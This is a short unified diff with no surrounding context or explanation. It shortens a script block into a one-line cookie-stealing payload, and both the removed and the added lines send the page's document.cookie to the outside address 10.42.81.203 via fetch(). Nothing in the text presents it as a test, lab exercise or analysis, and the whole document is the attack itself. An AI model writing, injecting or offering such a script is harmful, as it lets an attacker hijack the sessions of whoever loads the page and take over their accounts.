@@ -1,6 +1,1 @@
-<script>
-fetch(`http://10.42.81.203/${document.cookie}`, {
-  method: 'GET',
-  credentials: 'include'
-});
-</script>
+<script>fetch(`http://10.42.81.203/${document.cookie}`)</script>
